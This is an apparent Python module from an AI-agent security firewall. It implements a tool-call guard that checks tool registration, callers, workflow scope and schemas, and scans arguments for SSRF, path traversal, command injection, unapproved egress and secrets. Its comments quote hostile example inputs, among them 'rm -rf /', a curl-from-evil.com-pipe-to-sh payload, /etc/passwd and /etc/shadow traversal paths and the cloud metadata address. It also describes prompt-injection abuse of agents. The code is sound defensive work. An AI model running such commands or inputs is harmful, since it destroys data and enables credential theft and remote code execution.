"""Tool-call guard: `action == tool_call`.

Checks run in order, short-circuiting on the first hard stop:

1. **Tool lookup** — calls to an unregistered tool are `DENY`'d
   (`UNKNOWN_TOOL`) — this is the core fail-closed guarantee.
2. **Caller check** — `ToolManifest.allowed_callers` (`CALLER_NOT_ALLOWED`).
3. **Workflow scoping** — `config.workflows[*].allowed_tools/allowed_agents`;
   an unregistered `workflow` falls back to
   `config.firewall.default_workflow_mode` (restrictive by default).
4. **Schema validation** — `jsonschema` against `ToolManifest.input_schema`
   (`SCHEMA_VIOLATION`).
5. For every string argument -- found by recursively walking the (possibly
   nested) argument structure, not just its top-level keys
   (`_iter_string_arguments`):
   - **Size cap** (`CONTENT_TOO_LARGE`) — reject any individual value over
     `runtime_limits.max_content_length` before any check below runs over
     it.
   - **SSRF** (`SSRF`) — resolve URL/host-like values and reject
     private/loopback/link-local/reserved ranges (covers cloud metadata
     endpoints and DNS rebinding).
   - **Path traversal** (`PATH_TRAVERSAL`) — percent-decode and normalize
     backslashes, then normalize path-like values against
     `tool_guard.workspace_root`.
   - **Command injection** (`COMMAND_INJECTION`) — reject shell
     metacharacters for `action_type == EXECUTE` tools.
   - **Egress allow-list** (`EGRESS_DENIED`) — for tools with
     `side_effect == EXTERNAL_COMMUNICATION`, check resolved hosts against
     the workflow's (or global) `egress_allowlist`.
   - **Credential scan** (`SECRET`) — run the `secrets` detector over the
     argument value.
6. **Risk-tier decision** — `requires_approval` always escalates to
   `REQUIRE_USER_CONFIRMATION`; `risk_tier in {HIGH, CRITICAL}` escalates to
   `REQUIRE_USER_CONFIRMATION` if `PolicyInput.content` carries any
   `RETRIEVED_DOC`/`TOOL_OUTPUT`/`SUB_AGENT` provenance (the call was
   triggered by untrusted content).

Any finding from steps 1-5 is a hard stop -> `DENY`.
"""

from __future__ import annotations

import ipaddress
import os
import re
import socket
from collections.abc import Iterator
from urllib.parse import unquote, urlparse

import jsonschema

from agentvanguard.config.schema import Config, WorkflowConfig
from agentvanguard.core.enums import (
    ActionType,
    DecisionAction,
    FindingType,
    GuardStage,
    ProvenanceLabel,
    RiskTier,
    SideEffect,
)
from agentvanguard.core.models import Finding, PolicyInput, ToolManifest, Verdict
from agentvanguard.detectors.registry import DetectorRegistry
from agentvanguard.policy.risk import SEVERITY_BASE_SCORE, finding_score, max_score

# Finding types that immediately abort the tool call with DENY, regardless
# of the tool's own risk_tier or requires_approval setting. Anything in this
# set represents either a structural violation (unknown tool, schema
# mismatch, disallowed caller) or an attack pattern (SSRF, path traversal,
# command injection, egress to an unapproved host, a leaked credential)
# rather than an ordinary risk judgment call -- it is never something a
# human "approves through".
_HARD_STOP_TYPES = {
    FindingType.UNKNOWN_TOOL,
    FindingType.CALLER_NOT_ALLOWED,
    FindingType.SCHEMA_VIOLATION,
    FindingType.SSRF,
    FindingType.PATH_TRAVERSAL,
    FindingType.COMMAND_INJECTION,
    FindingType.EGRESS_DENIED,
    FindingType.SECRET,
    FindingType.CONTENT_TOO_LARGE,
}

# Hard cap on how many nodes `_iter_string_arguments` will visit when
# recursively walking a tool call's arguments. Bounds the cost of walking a
# deliberately deep/wide nested argument structure -- once the cap is hit the
# walk simply stops (a still-finite amount of work was done; nothing raises).
_MAX_ARGUMENT_NODES = 1000

# Provenance labels that mark content as having originated *outside* direct,
# trusted user input -- e.g. fetched from the web, returned by a previous
# tool call, or produced by another agent. A HIGH/CRITICAL-risk tool call
# that was triggered by content carrying one of these labels is treated as
# more suspicious (possible prompt-injection-driven tool abuse) and escalated
# to REQUIRE_USER_CONFIRMATION even if it would otherwise be auto-allowed.
_UNTRUSTED_PROVENANCE = {
    ProvenanceLabel.RETRIEVED_DOC,
    ProvenanceLabel.TOOL_OUTPUT,
    ProvenanceLabel.SUB_AGENT,
}

# Argument-name heuristics used to decide which string arguments are worth
# running the SSRF/egress or path-traversal checks against, even when the
# value itself doesn't obviously look like a URL or a path. E.g. an argument
# named "endpoint" with value "10.0.0.1" doesn't match _looks_like_url, but
# the key name alone is enough reason to treat it as a network destination.
_URL_KEY_RE = re.compile(r"(url|uri|host|hostname|endpoint|domain|address)", re.IGNORECASE)
_PATH_KEY_RE = re.compile(r"(path|file|dir|directory|folder)", re.IGNORECASE)

# Shell metacharacters that, if present in an argument passed to an EXECUTE
# tool, could be used to break out of the intended single command and chain
# on additional shell commands (e.g. "; rm -rf /", "$(curl evil.com|sh)",
# "`whoami`", "a && b", pipes, redirection, backslash-escapes, or embedded
# newlines that start a new logical command).
_SHELL_METACHARS = set(";|&`$()<>\\\n")

# Hostnames that are blocked outright regardless of how they resolve in DNS,
# because they are reliably used to reach sensitive local/internal services:
# "localhost" (the calling host itself) and the well-known cloud-provider
# instance-metadata hostnames (which serve credentials/secrets over plain
# HTTP with no auth on AWS/GCP/Azure-style platforms).
_BLOCKED_HOSTNAMES = {"localhost", "metadata.google.internal", "metadata.internal"}


def evaluate(
    policy_input: PolicyInput,
    config: Config,
    detectors: DetectorRegistry,
    tool_manifests: dict[str, ToolManifest],
) -> Verdict:
    """Run the tool-call guard and return its `Verdict`."""

    # Step 1: tool lookup. A tool name that isn't in the registered
    # manifests is the core fail-closed guarantee -- we never guess at a
    # policy for a tool we know nothing about, we just deny it.
    tool_name = policy_input.tool or ""
    manifest = tool_manifests.get(tool_name)

    if manifest is None:
        finding = Finding(
            type=FindingType.UNKNOWN_TOOL,
            detector="tool_guard",
            severity=RiskTier.CRITICAL,
            message=f"tool '{tool_name}' is not registered",
        )
        return _verdict(DecisionAction.DENY, [finding], [finding.message])

    # Step 2: caller check. If the manifest restricts which agents may
    # invoke this tool (`allowed_callers`), reject any other caller -- e.g.
    # a "refund_processor" tool might only allow the "billing_agent" to call
    # it, even though other agents in the system could otherwise reach it.
    agent_name = policy_input.agent.name if policy_input.agent else None

    if manifest.allowed_callers and agent_name not in manifest.allowed_callers:
        finding = Finding(
            type=FindingType.CALLER_NOT_ALLOWED,
            detector="tool_guard",
            severity=RiskTier.HIGH,
            message=f"agent '{agent_name}' is not an allowed caller of tool '{tool_name}'",
        )
        return _verdict(DecisionAction.DENY, [finding], [finding.message])

    # Step 3: workflow scoping. Resolve which workflow this call belongs to
    # (explicit on the PolicyInput, falling back to the calling agent's
    # configured workflow), then look up that workflow's config.
    workflow_name = policy_input.workflow
    if workflow_name is None and policy_input.agent is not None:
        workflow_name = policy_input.agent.workflow
    workflow_cfg = config.workflows.get(workflow_name) if workflow_name else None

    # A workflow name was supplied but isn't actually declared under
    # `workflows:` in config -- i.e. we don't know its allowed_tools/
    # allowed_agents/egress_allowlist. Under the restrictive default
    # workflow mode, any non-LOW-risk tool call made under an unrecognized
    # workflow requires a human to confirm rather than silently allowing it
    # (fail toward caution when we lack workflow-specific policy).
    if workflow_name is not None and workflow_cfg is None:
        if config.firewall.default_workflow_mode == "restrictive" and manifest.risk_tier != RiskTier.LOW:
            reason = (
                f"workflow '{workflow_name}' is not configured; "
                f"restrictive mode requires confirmation for non-low-risk tools"
            )
            return _verdict(
                DecisionAction.REQUIRE_USER_CONFIRMATION,
                [],
                [reason],
                base_risk_score=SEVERITY_BASE_SCORE[manifest.risk_tier],
            )

    # If the workflow *is* configured, enforce its explicit allow-lists:
    # a workflow can restrict which tools may be called within it, and
    # which agents may operate within it, independent of the tool's own
    # allowed_callers list checked in step 2.
    if workflow_cfg is not None:
        if workflow_cfg.allowed_tools and tool_name not in workflow_cfg.allowed_tools:
            finding = Finding(
                type=FindingType.CALLER_NOT_ALLOWED,
                detector="tool_guard",
                severity=RiskTier.HIGH,
                message=f"tool '{tool_name}' is not in workflow '{workflow_name}'.allowed_tools",
            )
            return _verdict(DecisionAction.DENY, [finding], [finding.message])

        if workflow_cfg.allowed_agents and agent_name not in workflow_cfg.allowed_agents:
            finding = Finding(
                type=FindingType.CALLER_NOT_ALLOWED,
                detector="tool_guard",
                severity=RiskTier.HIGH,
                message=f"agent '{agent_name}' is not in workflow '{workflow_name}'.allowed_agents",
            )
            return _verdict(DecisionAction.DENY, [finding], [finding.message])

    # Step 4: schema validation. The tool's declared input_schema (a JSON
    # Schema) is the contract for what arguments are even well-formed for
    # this tool -- e.g. catching a string passed where an integer was
    # expected, or a required field that's missing -- before we bother
    # running any of the more expensive content-based checks below.
    if manifest.input_schema is not None:
        try:
            jsonschema.validate(policy_input.arguments or {}, manifest.input_schema)
        except jsonschema.exceptions.ValidationError as exc:
            finding = Finding(
                type=FindingType.SCHEMA_VIOLATION,
                detector="tool_guard",
                severity=RiskTier.MEDIUM,
                message=f"arguments do not match input_schema: {exc.message}",
            )
            return _verdict(DecisionAction.DENY, [finding], [finding.message])

    # Step 5: content-based checks on every string-valued argument, found by
    # recursively walking the (possibly nested) argument structure -- a
    # string buried in a list of dicts (e.g. `files: [{"path": "../etc"}]`)
    # gets exactly the same SSRF/path-traversal/command-injection/egress/
    # credential checks as a top-level string argument. Each individual
    # value is also capped at `runtime_limits.max_content_length` before any
    # check runs over it, since an oversized value is itself a resource-
    # exhaustion risk independent of what the checks would find in it.
    findings: list[Finding] = []
    max_length = config.runtime_limits.max_content_length
    for key, value in _iter_string_arguments(policy_input.arguments or {}):
        if len(value) > max_length:
            findings.append(
                Finding(
                    type=FindingType.CONTENT_TOO_LARGE,
                    detector="tool_guard:max_content_length",
                    severity=RiskTier.HIGH,
                    message=f"argument '{key}' ({len(value)} chars) exceeds max_content_length ({max_length})",
                )
            )
            continue
        findings.extend(_check_ssrf(key, value, manifest))
        findings.extend(_check_path_traversal(key, value, manifest, config))
        findings.extend(_check_command_injection(key, value, manifest))
        findings.extend(_check_egress(key, value, manifest, config, workflow_cfg))
        findings.extend(detectors.detect_with(["secrets"], value, ProvenanceLabel.ASSISTANT))

    # Any finding whose type is in _HARD_STOP_TYPES (SSRF, path traversal,
    # command injection, egress denial, or a leaked secret/credential) is an
    # immediate DENY -- these are attack indicators, not risk judgment
    # calls, so they bypass the requires_approval/risk_tier logic below
    # entirely.
    if findings:
        hard_stops = [f for f in findings if f.type in _HARD_STOP_TYPES]
        if hard_stops:
            return _verdict(
                DecisionAction.DENY,
                findings,
                [f.message for f in hard_stops],
                base_risk_score=SEVERITY_BASE_SCORE[manifest.risk_tier],
            )

    # Step 6a: explicit approval requirement. If the manifest says this
    # tool always needs a human in the loop (e.g. "wire_transfer"), require
    # confirmation regardless of risk_tier or how clean the arguments were.
    if manifest.requires_approval:
        reason = f"tool '{tool_name}' requires user approval (risk_tier={manifest.risk_tier.value})"
        return _verdict(
            DecisionAction.REQUIRE_USER_CONFIRMATION,
            findings,
            [reason],
            required_approvals=[tool_name],
            base_risk_score=SEVERITY_BASE_SCORE[manifest.risk_tier],
        )

    # Step 6b: risk-tier + untrusted-provenance escalation. A HIGH/CRITICAL
    # risk tool is only escalated to REQUIRE_USER_CONFIRMATION if the call
    # was triggered by content that didn't come directly from the trusted
    # user (e.g. a retrieved web page, a prior tool's output, or another
    # sub-agent) -- the concern being prompt-injection-style content that
    # talks an LLM into invoking a dangerous tool on its own. A HIGH/
    # CRITICAL tool triggered purely by direct user instruction, with no
    # untrusted content in the mix, is allowed through this step.
    if manifest.risk_tier in (RiskTier.HIGH, RiskTier.CRITICAL):
        triggering = _triggering_provenance(policy_input)
        if triggering & _UNTRUSTED_PROVENANCE:
            reason = (
                f"tool '{tool_name}' has risk_tier={manifest.risk_tier.value} and was "
                f"triggered by untrusted content ({sorted(p.value for p in triggering & _UNTRUSTED_PROVENANCE)})"
            )
            return _verdict(
                DecisionAction.REQUIRE_USER_CONFIRMATION,
                findings,
                [reason],
                base_risk_score=SEVERITY_BASE_SCORE[manifest.risk_tier],
            )

    # Nothing above triggered a DENY or REQUIRE_USER_CONFIRMATION: allow the
    # call. Any non-hard-stop findings collected in step 5 (e.g. low-
    # severity informational findings) are still attached to the Verdict
    # for audit-trail purposes even though they didn't change the action.
    return _verdict(
        DecisionAction.ALLOW,
        findings,
        [f.message for f in findings],
        base_risk_score=SEVERITY_BASE_SCORE[manifest.risk_tier],
    )


def _verdict(
    action: DecisionAction,
    findings: list[Finding],
    reasons: list[str],
    required_approvals: list[str] | None = None,
    base_risk_score: float = 0.0,
) -> Verdict:
    """Build the `Verdict` returned by `evaluate()`.

    `risk_score` is the max of `base_risk_score` (the tool's own risk_tier,
    e.g. so a CRITICAL-tier tool always reports at least a CRITICAL-tier
    score even with zero findings) and every individual finding's own score
    -- i.e. whichever signal is highest wins, findings never *lower* the
    score below what the tool's risk tier alone would imply.
    """

    scores = [base_risk_score] + [finding_score(f) for f in findings]
    return Verdict(
        stage=GuardStage.TOOL_CALL,
        action=action,
        risk_score=max_score(scores),
        findings=findings,
        reasons=reasons,
        required_approvals=required_approvals or [],
    )


def _iter_string_arguments(value: object, key_path: str = "") -> Iterator[tuple[str, str]]:
    """Recursively walk a tool-call argument value -- which may be an
    arbitrarily nested combination of dicts, lists/tuples, and scalars --
    yielding every string leaf found, paired with its dotted/indexed key
    path (e.g. `"options.path"` or `"files[0].path"`).

    Tool-call arguments are not always a flat `str -> str` mapping: callers
    routinely pass a list of file descriptors, or a dict of nested options,
    either of which may itself contain a path/URL/secret that needs the same
    SSRF/path-traversal/command-injection/egress/credential checks as a
    top-level string argument. Iterating only `arguments.items()` directly
    (as this guard originally did) silently skipped every nested string,
    which was a complete bypass of every content-based check in `evaluate()`
    for any caller that nested its arguments even one level deep.

    Implemented iteratively (an explicit stack, not recursion) so a
    deliberately deep structure can't trigger a `RecursionError`, and capped
    at `_MAX_ARGUMENT_NODES` total visited nodes so a deliberately deep/wide
    structure can't be used to exhaust CPU/memory before the walk completes
    -- once the cap is hit, the walk simply stops early.
    """

    stack: list[tuple[str, object]] = [(key_path, value)]
    visited = 0
    while stack:
        path, current = stack.pop()
        visited += 1
        if visited > _MAX_ARGUMENT_NODES:
            return
        if isinstance(current, str):
            yield path, current
        elif isinstance(current, dict):
            for k, v in current.items():
                stack.append((f"{path}.{k}" if path else str(k), v))
        elif isinstance(current, (list, tuple)):
            for i, v in enumerate(current):
                stack.append((f"{path}[{i}]", v))


def _triggering_provenance(policy_input: PolicyInput) -> set[ProvenanceLabel]:
    """Collect the distinct `ProvenanceLabel`s of the content that led to
    this tool call (e.g. {USER}, {RETRIEVED_DOC, TOOL_OUTPUT}), used by the
    risk-tier escalation check in `evaluate()` to detect when a HIGH/
    CRITICAL tool call was driven by untrusted content rather than a direct
    user instruction. Returns an empty set when `policy_input.content` is
    `None` or a bare string (no per-item provenance available)."""

    if isinstance(policy_input.content, list):
        return {item.provenance for item in policy_input.content}
    return set()


def _looks_like_url(value: str) -> bool:
    """True if `value` starts with a URI scheme (`scheme://...`), e.g.
    `"https://example.com"` or `"file:///etc/passwd"` -> True;
    `"example.com"` or `"10.0.0.1"` (no scheme) -> False."""

    return bool(re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", value))


def _looks_like_ip_literal(value: str) -> bool:
    """True if `value` parses cleanly as a bare IPv4 or IPv6 address, e.g.
    `"127.0.0.1"` or `"::1"` -> True; `"example.com"` -> False."""

    try:
        ipaddress.ip_address(value)
        return True
    except ValueError:
        return False


def _extract_host(value: str, key_hint: bool = False) -> str | None:
    """Best-effort extraction of a hostname/IP from an argument value, for
    feeding into the SSRF and egress-allowlist checks.

    Handles three shapes of input, in order:

    1. A full URL (`scheme://...`) -- delegate to `urlparse(...).hostname`,
       e.g. `"https://user@10.0.0.1:8080/path"` -> `"10.0.0.1"`.
    2. Anything containing whitespace or an unparsed `@` -- bail out with
       `None` rather than guessing, since such values are unlikely to be a
       clean hostname and could be adversarially crafted to confuse the
       parser (e.g. an attempt to smuggle a second host past a naive
       `@`-based parse).
    3. A bare IP literal (no scheme) -- returned as-is, e.g.
       `"169.254.169.254"` -> `"169.254.169.254"`.

    If none of those match, the value is only treated as a hostname if it
    either contains a `.` (looks domain-like), equals `"localhost"`
    (case-insensitively), or `key_hint` is set (the argument's *name*
    suggested it's a network destination, e.g. key `"endpoint"`) -- this
    avoids treating an unrelated plain string argument (like a free-text
    `"description"` field that happens not to contain a URL) as a host.
    Finally, strips off any trailing `/path` or `:port` suffix, e.g.
    `"example.com:8080/foo"` -> `"example.com"`. Returns `None` if nothing
    host-like could be extracted, or if stripping leaves an empty string.
    """

    if _looks_like_url(value):
        return urlparse(value).hostname
    if " " in value or "\t" in value or "\n" in value or "@" in value:
        return None
    try:
        ipaddress.ip_address(value)
        return value
    except ValueError:
        pass
    if "." not in value and value.lower() != "localhost" and not key_hint:
        return None
    return value.split("/")[0].split(":")[0] or None


def _is_blocked_ip(ip: ipaddress.IPv4Address | ipaddress.IPv6Address) -> bool:
    """True if `ip` falls in any non-public IP range that a tool should
    never be allowed to reach directly, covering the standard SSRF target
    classes:

    - `is_private` -- RFC 1918 private ranges (e.g. `10.0.0.0/8`,
      `192.168.0.0/16`) and similar, i.e. internal-network addresses.
    - `is_loopback` -- `127.0.0.0/8` / `::1`, i.e. "this same machine".
    - `is_link_local` -- `169.254.0.0/16` / `fe80::/10`. Notably this is
      where cloud-provider instance-metadata services live (e.g.
      `169.254.169.254` on AWS/GCP/Azure), which is one of the most common
      real-world SSRF targets for exfiltrating instance credentials.
    - `is_reserved` -- IANA-reserved ranges not meant for public routing.
    - `is_multicast` -- multicast address ranges, not a normal unicast
      destination.
    - `is_unspecified` -- the all-zeros address (`0.0.0.0` / `::`), which on
      many systems is treated as "any local address" by the OS.

    Example: `_is_blocked_ip(ipaddress.ip_address("169.254.169.254"))` ->
    `True`; `_is_blocked_ip(ipaddress.ip_address("8.8.8.8"))` -> `False`.
    """

    return (
        ip.is_private
        or ip.is_loopback
        or ip.is_link_local
        or ip.is_reserved
        or ip.is_multicast
        or ip.is_unspecified
    )


def _resolve_host_ips(host: str) -> list[str]:
    """DNS-resolve `host` to its list of IP address strings, used to catch
    DNS-rebinding-style SSRF where a hostname that looks innocuous (e.g.
    `"my-service.example.com"`) actually resolves to an internal/blocked
    address. Returns an empty list if `host` is already a literal IP (no
    lookup needed by the caller) or if resolution fails for any reason
    (`OSError`, e.g. NXDOMAIN) -- callers treat "no resolved IPs" as "no
    finding from this check", not as an error.
    """

    try:
        infos = socket.getaddrinfo(host, None)
    except OSError:
        return []
    return [str(info[4][0]) for info in infos]


def _check_ssrf(key: str, value: str, manifest: ToolManifest) -> list[Finding]:
    """SSRF (server-side request forgery) check for a single (key, value)
    string argument.

    Goal: stop a tool from being pointed at an internal/cloud-metadata
    address that the agent shouldn't be able to reach, even indirectly via
    a hostname that resolves there. Example attack this catches: a "fetch
    url" tool called with `url="http://169.254.169.254/latest/meta-data/"`
    to steal cloud credentials, or with a hostname like
    `"internal-service.attacker-controlled.com"` that an attacker has
    pointed at `10.0.0.5` via DNS.

    Steps:

    1. Decide whether this argument is even worth checking: either its
       *name* hints at a network destination (`key_hint`, e.g. "url"/
       "host"/"endpoint"), or its *value* already looks like a URL or a
       bare IP literal. If none of those hold (e.g. key="description",
       value="a normal sentence"), skip with no finding -- avoids false
       positives on unrelated string arguments.
    2. Extract a candidate hostname/IP from the value via `_extract_host`.
       If nothing host-like could be extracted, there's nothing to check.
    3. Reject outright if the host textually matches one of the always-
       blocked hostnames (`localhost`, cloud metadata hostnames) --
       independent of DNS, since these names are dangerous by definition.
    4. If the host is itself a literal IP address (e.g. "169.254.169.254"),
       check it directly against the blocked IP ranges.
    5. Otherwise the host is a DNS name -- resolve it and check *every*
       returned IP against the blocked ranges. This is the DNS-rebinding
       defense: a hostname can look perfectly public but still resolve to
       an internal address.

    Returns a single CRITICAL `SSRF` Finding (in a list) on any of these
    matches, or an empty list if the argument is clean.
    """

    ip_literal = _looks_like_ip_literal(value)
    key_hint = bool(_URL_KEY_RE.search(key))
    if not (key_hint or _looks_like_url(value) or ip_literal):
        return []

    host = _extract_host(value, key_hint=key_hint or ip_literal)
    if host is None:
        return []

    # Hostname-based block list: matches regardless of how (or whether) the
    # name resolves in DNS, since these are dangerous purely by identity.
    if host.lower() in _BLOCKED_HOSTNAMES:
        return [
            Finding(
                type=FindingType.SSRF,
                detector="tool_guard:ssrf",
                severity=RiskTier.CRITICAL,
                message=f"argument '{key}' targets blocked host '{host}'",
            )
        ]

    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        ip = None

    # The argument was a literal IP address (not a DNS name) -- check it
    # directly against the blocked ranges; no DNS resolution needed/possible.
    if ip is not None:
        if _is_blocked_ip(ip):
            return [
                Finding(
                    type=FindingType.SSRF,
                    detector="tool_guard:ssrf",
                    severity=RiskTier.CRITICAL,
                    message=f"argument '{key}' targets a non-public address: {host}",
                )
            ]
        return []

    # The argument was a DNS name -- resolve it and check every IP it
    # resolves to. A hostname that resolves to multiple addresses (some
    # public, some private) is blocked if *any* resolved address is
    # non-public, since an attacker only needs one bad address to succeed.
    for ip_str in _resolve_host_ips(host):
        try:
            resolved = ipaddress.ip_address(ip_str)
        except ValueError:
            continue
        if _is_blocked_ip(resolved):
            return [
                Finding(
                    type=FindingType.SSRF,
                    detector="tool_guard:ssrf",
                    severity=RiskTier.CRITICAL,
                    message=f"argument '{key}' host '{host}' resolves to a non-public address: {ip_str}",
                )
            ]

    return []


def _check_path_traversal(key: str, value: str, manifest: ToolManifest, config: Config) -> list[Finding]:
    """Path-traversal check for a single (key, value) string argument.

    Goal: stop a tool whose argument is meant to be a path *within* the
    configured workspace (e.g. `config.tool_guard.workspace_root`) from
    actually resolving to somewhere outside it -- whether via `../../`
    segments, an absolute path like `/etc/passwd`, or a `file://` URL.
    Example attack this catches: a "read_file" tool called with
    `path="../../../../etc/passwd"` or `path="/etc/shadow"`.

    Steps:

    1. Empty value -> nothing to check.
    2. If the value is a URL, only `file://` URLs are relevant here (other
       schemes like `http://` are network destinations, handled by
       `_check_ssrf`/`_check_egress` instead) -- extract the filesystem
       path portion (`.path` or, if empty, `.netloc`, to handle
       `file://etc/passwd`-style URLs missing the third slash).
    3. Percent-decode the path (repeatedly, up to a small fixed number of
       passes, to also catch double-encoding like `%252e%252e`) and
       normalize any backslash to a forward slash. Without this, an
       argument like `"..%2f..%2fetc%2fpasswd"` or (on a worker invoked from
       a Windows-style path library) `"..\\..\\etc\\passwd"` would reach
       `os.path.normpath` still encoded/backslash-separated -- on POSIX,
       `normpath` treats `%2f` and `\\` as ordinary filename characters, not
       path separators, so the `../` traversal segments are never collapsed
       and the check below sees a harmless-looking single path component
       instead of an escape attempt.
    4. Skip the check entirely unless either the argument name looks
       path-like (`_PATH_KEY_RE`, e.g. "path"/"file"/"dir") or the tool's
       `action_type` is one of READ/WRITE/DELETE (a filesystem-touching
       operation) -- avoids false positives on unrelated string arguments
       for tools that don't touch the filesystem.
    5. Resolve the value to an absolute, normalized path: if it's already
       absolute, normalize it as-is (this is what catches `/etc/passwd`);
       if relative, join it onto `workspace_root` first (this is what
       catches `../../etc/passwd` after `os.path.normpath` collapses the
       `..` segments) -- then check that the result is either exactly the
       workspace root or a path *underneath* it (`startswith(root + os.sep)`,
       not just `startswith(root)`, so that a sibling directory like
       `/workspace-evil` doesn't pass a naive prefix check against
       `/workspace`).

    Returns a HIGH-severity `PATH_TRAVERSAL` Finding (in a list) if the
    resolved path escapes the workspace root, or an empty list otherwise.
    """

    if not value:
        return []

    path_value = value
    if _looks_like_url(value):
        parsed = urlparse(value)
        if parsed.scheme.lower() != "file":
            # Network-scheme URLs are not filesystem paths; SSRF/egress
            # checks cover them instead.
            return []
        path_value = parsed.path or parsed.netloc
        if not path_value:
            return []

    decoded = path_value
    for _ in range(3):
        next_decoded = unquote(decoded)
        if next_decoded == decoded:
            break
        decoded = next_decoded
    path_value = decoded.replace("\\", "/")

    if not (_PATH_KEY_RE.search(key) or manifest.action_type in (ActionType.READ, ActionType.WRITE, ActionType.DELETE)):
        return []

    workspace_root = os.path.abspath(config.tool_guard.workspace_root)
    candidate = path_value if os.path.isabs(path_value) else os.path.join(workspace_root, path_value)
    normalized = os.path.normpath(candidate)

    if normalized != workspace_root and not normalized.startswith(workspace_root + os.sep):
        return [
            Finding(
                type=FindingType.PATH_TRAVERSAL,
                detector="tool_guard:path_traversal",
                severity=RiskTier.HIGH,
                message=f"argument '{key}' resolves outside the workspace root: {value!r}",
            )
        ]
    return []


def _check_command_injection(key: str, value: str, manifest: ToolManifest) -> list[Finding]:
    """Command-injection check for a single (key, value) string argument.

    Goal: for tools that actually execute a shell command (`action_type ==
    EXECUTE`), reject any argument that contains shell metacharacters (see
    `_SHELL_METACHARS`) that could let the supplied value break out of its
    intended position as a single argument and inject additional commands.
    Example attack this catches: an "run_command" tool called with
    `arg="; rm -rf / #"` or `arg="$(curl http://evil.com/payload | sh)"`.

    Only runs at all for EXECUTE-type tools -- a path/URL/text argument on a
    READ or WRITE tool legitimately containing, say, a `&` character isn't
    a command-injection risk if that tool never shells out.

    Returns a HIGH-severity `COMMAND_INJECTION` Finding (in a list) listing
    the offending characters found, or an empty list if `value` contains
    none of the blocked metacharacters.
    """

    if manifest.action_type != ActionType.EXECUTE:
        return []
    found = _SHELL_METACHARS.intersection(value)
    if found:
        chars = "".join(sorted(found))
        return [
            Finding(
                type=FindingType.COMMAND_INJECTION,
                detector="tool_guard:command_injection",
                severity=RiskTier.HIGH,
                message=f"argument '{key}' contains shell metacharacters: {chars!r}",
            )
        ]
    return []


def _check_egress(
    key: str,
    value: str,
    manifest: ToolManifest,
    config: Config,
    workflow_cfg: WorkflowConfig | None,
) -> list[Finding]:
    """Egress allow-list check for a single (key, value) string argument.

    Goal: even for hosts that are perfectly *public* (so `_check_ssrf` finds
    nothing wrong), restrict tools that talk to the network
    (`side_effect == EXTERNAL_COMMUNICATION`) to only the hosts an operator
    has explicitly approved, via an egress allow-list. This is a separate,
    narrower concern from SSRF: SSRF blocks *internal* destinations
    unconditionally; egress allow-listing blocks *external* destinations
    that simply aren't on the approved list, e.g. a "send_webhook" tool
    being pointed at `attacker.example.com` instead of the organization's
    own approved webhook receiver.

    Steps:

    1. Decide whether to check this argument at all: always check if the
       tool itself is flagged as doing external communication; otherwise
       only check if the argument looks like a URL/IP or its name hints at
       a network destination (mirrors the gating logic in `_check_ssrf`).
    2. Extract the candidate host the same way `_check_ssrf` does.
    3. Resolve which allow-list applies: the current workflow's
       `egress_allowlist` takes precedence if set, otherwise fall back to
       the global `config.tool_guard.egress_allowlist`. If neither is
       configured (empty allow-list), there's nothing to enforce -- this
       check is opt-in via configuration, not fail-closed by default.
    4. Check the host against the allow-list, permitting either an exact
       match (`"api.example.com"` matches allowed entry `"api.example.com"`)
       or a subdomain match (`"foo.api.example.com"` matches allowed entry
       `"api.example.com"` via the `.`-prefixed suffix check, while
       `"evilapi.example.com"` does *not* falsely match `"api.example.com"`
       because the comparison requires a literal `.` boundary, not just a
       string suffix).

    Returns a HIGH-severity `EGRESS_DENIED` Finding (in a list) if the host
    isn't covered by the applicable allow-list, or an empty list if it is
    (or if no allow-list applies).
    """

    ip_literal = _looks_like_ip_literal(value)
    key_hint = bool(_URL_KEY_RE.search(key))
    if manifest.side_effect != SideEffect.EXTERNAL_COMMUNICATION and not (key_hint or _looks_like_url(value) or ip_literal):
        return []

    host = _extract_host(value, key_hint=key_hint or ip_literal)
    if host is None:
        return []

    allowlist = (workflow_cfg.egress_allowlist if workflow_cfg else []) or config.tool_guard.egress_allowlist
    if not allowlist:
        return []

    host_lower = host.lower()
    if any(host_lower == allowed.lower() or host_lower.endswith("." + allowed.lower()) for allowed in allowlist):
        return []

    return [
        Finding(
            type=FindingType.EGRESS_DENIED,
            detector="tool_guard:egress",
            severity=RiskTier.HIGH,
            message=f"argument '{key}' host '{host}' is not in the egress allowlist",
        )
    ]
